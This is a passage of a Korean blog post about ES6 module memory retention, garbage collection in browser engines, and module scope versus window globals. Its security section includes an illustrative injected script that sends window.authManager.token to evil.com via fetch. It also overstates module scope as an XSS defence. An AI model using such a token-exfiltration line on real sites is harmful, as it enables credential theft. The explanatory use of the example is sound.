punctuation\",\"children\":\",\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token literal-property property\",\"children\":\"namespace\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token maybe-class-name\",\"children\":\"ModuleNamespaceExotic\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token literal-property property\",\"children\":\"exports\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],[\"$\",\"span\",null,{\"className\":\"token spread operator\",\"children\":\"...\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"8\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"9\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"TC39 멤버 Mark Miller가 설명한 바와 같이: \\\"식별자에서 모듈 인스턴스로의 테이블은 식별자로 인덱스됩니다. 식별자는 문자열이므로 이 테이블은 weak하지 않습니다. 이는 것들을 떨어뜨릴 수 있는 '캐시' 의미가 아닙니다. 오히려 모듈 인스턴스의 레지스트리입니다.\\\"\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"GC 루트 역할을 하는 모듈 관련 객체들에는 모든 로드된 모듈을 포함하는 전역 모듈 맵, 변수 바인딩을 유지하는 모듈 환경 레코드, export를 속성으로 노출하는 모듈 네임스페이스 객체, 그리고 모듈 메타데이터를 제공하는 import meta 객체가 포함됩니다. 이들은 개별 모듈 가비지 컬렉션을 방지하는 끊어지지 않는 체인을 만듭니다.\"}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"모듈-export와-전역-객체의-차이점\",\"children\":\"모듈 Export와 전역 객체의 차이점\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"모듈 export와 전역 객체는 근본적으로 다른 메모리 관리 특성을 보입니다:\"}],\"\\n\",[\"$\",\"table\",null,{\"children\":[[\"$\",\"thead\",null,{\"children\":[\"$\",\"tr\",null,{\"children\":[[\"$\",\"th\",null,{\"children\":\"측면\"}],[\"$\",\"th\",null,{\"children\":\"모듈 Export\"}],[\"$\",\"th\",null,{\"children\":\"전역 객체 (window)\"}]]}]}],[\"$\",\"tbody\",null,{\"children\":[[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"스코프\"}]}],[\"$\",\"td\",null,{\"children\":\"모듈 로컬 환경\"}],[\"$\",\"td\",null,{\"children\":\"전역 객체 속성\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"GC 동작\"}]}],[\"$\",\"td\",null,{\"children\":\"라이브 바인딩을 통해 유지\"}],[\"$\",\"td\",null,{\"children\":\"전역 객체를 통해 유지\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"메모리 참조\"}]}],[\"$\",\"td\",null,{\"children\":\"모듈 맵을 통한 간접 참조\"}],[\"$\",\"td\",null,{\"children\":\"직접 전역 참조\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"정리\"}]}],[\"$\",\"td\",null,{\"children\":\"모듈 언로딩 필요\"}],[\"$\",\"td\",null,{\"children\":\"개별적으로 삭제 가능\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"격리\"}]}],[\"$\",\"td\",null,{\"children\":\"모듈 스코프에 캡슐화\"}],[\"$\",\"td\",null,{\"children\":\"전역적으로 접근 가능\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"보안성\"}]}],[\"$\",\"td\",null,{\"children\":\"직접 접근 불가\"}],[\"$\",\"td\",null,{\"children\":\"직접 조작 가능\"}]]}]]}]]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"모듈 export는 모듈 레지스트리의 영구적 캐싱을 통해 메모리에 남아있는 반면, 전역 객체(window)에 등록된 것은 개별적으로 제거할 수 있습니다. 이 구분은 메모리 효율적인 애플리케이션을 설계할 때 중요해집니다.\"}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"모듈-레지스트리의-보안-이점\",\"children\":\"모듈 레지스트리의 보안 이점\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"ES6 모듈의 모듈 레지스트리는 \",[\"$\",\"code\",null,{\"children\":\"window\"}],\" 객체와 달리 \",[\"$\",\"strong\",null,{\"children\":\"직접 접근이 불가능\"}],\"하여 보안성이 크게 향상됩니다.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"🔐 보안성 비교\"}]}],\"\\n\",[\"$\",\"table\",null,{\"children\":[[\"$\",\"thead\",null,{\"children\":[\"$\",\"tr\",null,{\"children\":[[\"$\",\"th\",null,{\"children\":\"측면\"}],[\"$\",\"th\",null,{\"children\":\"window 방식\"}],[\"$\",\"th\",null,{\"children\":\"모듈 레지스트리 방식\"}]]}]}],[\"$\",\"tbody\",null,{\"children\":[[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"직접 접근\"}]}],[\"$\",\"td\",null,{\"children\":[[\"$\",\"code\",null,{\"children\":\"window.DataManager\"}],\" ✅\"]}],[\"$\",\"td\",null,{\"children\":[[\"$\",\"code\",null,{\"children\":\"window.DataManager\"}],\" ❌\"]}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"콘솔 조작\"}]}],[\"$\",\"td\",null,{\"children\":\"즉시 가능 🔴\"}],[\"$\",\"td\",null,{\"children\":\"import 필요 🟡\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"XSS 공격\"}]}],[\"$\",\"td\",null,{\"children\":\"매우 취약 🔴\"}],[\"$\",\"td\",null,{\"children\":\"제한적 🟡\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"실수 방지\"}]}],[\"$\",\"td\",null,{\"children\":\"충돌 위험 🔴\"}],[\"$\",\"td\",null,{\"children\":\"안전함 🟢\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"정적 분석\"}]}],[\"$\",\"td\",null,{\"children\":\"어려움 🔴\"}],[\"$\",\"td\",null,{\"children\":\"가능함 🟢\"}]]}]]}]]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"🛡️ 보안 개선 효과\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"1. 네임스페이스 보호\"}]}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// ❌ window 방식: 전역 오염\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token dom variable\",\"children\":\"window\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":[\"$\",\"span\",null,{\"className\":\"token maybe-class-name\",\"children\":\"DataManager\"}]}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" manager\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token console class-name\",\"children\":\"console\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"log\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token known-class-name class-name\",\"children\":\"Object\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"keys\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token dom variable\",\"children\":\"window\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"length\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 증가\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// ✅ 모듈 방식: 깨끗한 네임스페이스  \"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token maybe-class-name\",\"children\":\"DataManager\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" manager\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token console class-name\",\"children\":\"console\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"log\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token known-class-name class-name\",\"children\":\"Object\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"keys\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token dom variable\",\"children\":\"window\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"length\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 변화 없음\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"2. XSS 공격 차단\"}]}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// ❌ window 방식: 즉시 탈취 가능\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"\u003c\"}],\"script\",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"\u003e\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"fetch\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'https://evil.com'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" \\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token literal-property property\",\"children\":\"body\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token dom variable\",\"children\":\"window\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"authManager\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"token\"}],\" \\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"\u003c\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"/\"}],\"script\",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"\u003e\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"8\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// ✅ 모듈 방식: 복잡한 과정 필요\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"9\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"\u003c\"}],\"script\",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"\u003e\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"10\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./auth.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"then\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":\"m\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token arrow operator\",\"children\":\"=\u003e\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"/* 추가 단계 필요 */\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"11\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"\u003c\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"/\"}],\"script\",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"\u003e\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"3. 실수 방지\"}]}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// ❌ window 방식: 변수명 충돌\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"var\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token maybe-class-name\",\"children\":\"AuthManager\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"\\\"실수!\\\"\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token dom variable\",\"children\":\"window\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":[\"$\",\"span\",null,{\"className\":\"token maybe-class-name\",\"children\":\"AuthManager\"}]}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"getToken\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// TypeError!\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// ✅ 모듈 방식: 안전함\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"var\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token maybe-class-name\",\"children\":\"AuthManager\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"\\\"실수!\\\"\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" \\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token imports\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token maybe-class-name\",\"children\":\"AuthManager\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}]]}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"from\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./auth.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 정상 작동\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"💡 핵심 인사이트\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"ES6 모듈은 \\\"Security by Obscurity\\\"가 아닌 \\\"Security by Design\\\"을 제공합니다:\"}],\"\\n\",[\"$\",\"ul\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":\"모듈 레지스트리는 브라우저 내부에 캡슐화됨\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"오직 명시적인 \",[\"$\",\"code\",null,{\"children\":\"import\"}],\"를 통해서만 접근 가능\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"전역 네임스페이스 오염 방지\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"코드 인젝션 공격 표면 축소\"}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"따라서 \",[\"$\",\"strong\",null,{\"children\":[[\"$\",\"code\",null,{\"children\":\"window.DataManager = DataManager\"}],\"와 같은 코드는 ES6 모듈에서 불필요할 뿐만 아니라 보안을 약화시키는 코드\"]}],\"입니다.\"]}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"브라우저-모듈-로딩과-캐싱-시스템\",\"children\":\"브라우저 모듈 로딩과 캐싱 시스템\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"브라우저는 모듈을 위한 계층적 캐싱 시스템을 구현합니다. \",[\"$\",\"strong\",null,{\"children\":\"모듈 맵 캐시\"}],\"는 로드된 모듈의 주요 레지스트리 역할을 하며, URL로 Module Record를 영구적으로 저장합니다. \",[\"$\",\"strong\",null,{\"children\":\"HTTP 리소스 캐시\"}],\"는 표준 캐싱 헤더에 따라 원시 모듈 파일을 저장합니다. 추가로 V8과 같은 엔진은 성능 최적화를 위해 파싱된 바이트코드를 저장하는 \",[\"$\",\"strong\",null,{\"children\":\"컴파일 캐시\"}],\"를 유지합니다.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"모듈 로딩은 depth-first post-order 순회를 통한 엄격한 평가 순서를 따르며, 종속성이 종속자보다 먼저 평가되도록 보장합니다. 순환 종속성은 라이브 바인딩과 신중한 순서를 통해 해결되지만, 순환에 있는 모든 모듈이 함께 유지되어야 하는 강하게 연결된 구성요소를 만듭니다.\"}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"기술적-심화-분석\",\"children\":\"기술적 심화 분석\"}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"모듈-메모리-관리를-위한-내부-브라우저-메커니즘\",\"children\":\"모듈 메모리 관리를 위한 내부 브라우저 메커니즘\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"V8의 구현은 정교한 메모리 관리 전략을 보여줍니다. 모듈은 \",[\"$\",\"strong\",null,{\"children\":\"Isolate의 모듈 캐시\"}],\"에 저장되며, 영구 핸들이 모듈 네임스페이스 객체를 살아있게 유지합니다. 엔진은 젊은 세대와 오래된 세대에 대한 별개의 전략을 가진 세대별 가비지 컬렉터인 \",[\"$\",\"strong\",null,{\"children\":\"Orinoco\"}],\"를 사용합니다.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"젊은 세대(1-8MB)는 semi-space 설계의 \",[\"$\",\"strong\",null,{\"children\":\"Scavenger 알고리즘\"}],\"을 사용하며, 두 번의 GC 사이클을 버텨낸 객체를 오래된 세대로 승격시킵니다. 오래된 세대는 증분적 마킹, 동시 스위핑, 그리고 단편화 휴리스틱에 기반한 선택적 압축을 사용하는 \",[\"$\",\"strong\",null,{\"children\":\"Mark-Sweep-Compact\"}],\" 수집을 사용합니다.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"SpiderMonkey는 \",[\"$\",\"strong\",null,{\"children\":\"하이브리드 추적 가비지 컬렉터\"}],\"로 다른 접근법을 취합니다. V8보다 더 공격적인 증분적 수집을 사용하여 실행을 더 작은 슬라이스로 나눕니다. 엔진은 힙 파티션을 독립적으로 수집할 수 있는 zone 기반 수집을 사용하지만, 모듈들의 상호 연결된 특성 때문에 일반적으로 zone에 걸쳐 있습니다.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"JavaScriptCore는 모듈 메모리에 영향을 미치는 \",[\"$\",\"strong\",null,{\"children\":\"다계층 최적화\"}],\" 접근법을 구현합니다. Low Level Interpreter(LLInt)로 시작하여, 자주 호출되는 함수는 Baseline JIT(6회 이상 호출), DFG JIT(60회 이상 호출), 그리고 마지막으로 매우 핫한 코드를 위한 FTL JIT를 거칩니다. 이 계층화된 컴파일은 모듈 코드가 여러 컴파일된 형태로 동시에 존재할 수 있음을 의미하여 메모리 사용량에 영향을 줍니다.\"]}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"모듈-생명주기와-메모리-유지\",\"children\":\"모듈 생명주기와 메모리 유지\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"파싱 단계\"}],\"에서 추상 구문 트리가 생성되고 모듈의 생명주기 동안 영구적으로 유지됩니다. 모듈 Record 객체는 정적 구조 정보와 함께 할당되고, import/export 항목은 아직 라이브 바인딩을 만들지 않은 채로 분류됩니다. 이 단계에서의 메모리 사용량은 상대적으로 낮지만 영구적입니다.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"인스턴스화 단계\"}],\"가 가장 중요한 메모리 영향을 미칩니다. 각 모듈에 대해 Environment Record가 생성되고, 라이브 바인딩이 모듈 간의 공유 메모리 참조를 설정하며, export 객체가 할당되지만 아직 채워지지는 않습니다. 순환 종속성 지원에는 바인딩 슬롯의 사전 할당이 필요하여 메모리 오버헤드를 더욱 증가시킵니다.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"평가\"}],\" 중에는 모듈 실행 컨텍스트가 생성되고 무한정 보존됩니다. 최상위 변수는 전역 스코프가 아닌 모듈 스코프에 할당되고, 모듈 내의 함수 클로저는 모듈 환경에 대한 참조를 유지합니다. 평가 중의 모든 부작용은 추가적인 GC 루트를 만들 수 있어 모듈을 메모리에 더욱 고착시킵니다.\"]}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"다양한-모듈-시스템-간의-비교\",\"children\":\"다양한 모듈 시스템 간의 비교\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"성능 분석은 모듈 시스템 간의 중요한 차이를 보여줍니다. 특히 메모리 관리와 가비지 컬렉션 측면에서 각 시스템은 근본적으로 다른 접근 방식을 사용합니다.\"}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"es6-모듈-vs-commonjs-핵심-차이점\",\"children\":\"ES6 모듈 vs CommonJS 핵심 차이점\"}],\"\\n\",[\"$\",\"table\",null,{\"children\":[[\"$\",\"thead\",null,{\"children\":[\"$\",\"tr\",null,{\"children\":[[\"$\",\"th\",null,{\"children\":\"측면\"}],[\"$\",\"th\",null,{\"children\":\"CommonJS\"}],[\"$\",\"th\",null,{\"children\":\"ES6 모듈\"}]]}]}],[\"$\",\"tbody\",null,{\"children\":[[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"기본 상태\"}]}],[\"$\",\"td\",null,{\"children\":\"require.cache에 임시 저장\"}],[\"$\",\"td\",null,{\"children\":\"모듈 맵에 영구 저장\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"가비지 컬렉션\"}]}],[\"$\",\"td\",null,{\"children\":[[\"$\",\"code\",null,{\"children\":\"delete require.cache[...]\"}],\"로 가능\"]}],[\"$\",\"td\",null,{\"children\":\"불가능\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"영구 보존\"}]}],[\"$\",\"td\",null,{\"children\":[[\"$\",\"code\",null,{\"children\":\"window/global\"}],\"에 \",[\"$\",\"strong\",null,{\"children\":\"수동 등록\"}],\" 필요\"]}],[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"자동으로 보존\"}]}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"개발자 작업\"}]}],[\"$\",\"td\",null,{\"children\":\"명시적 메모리 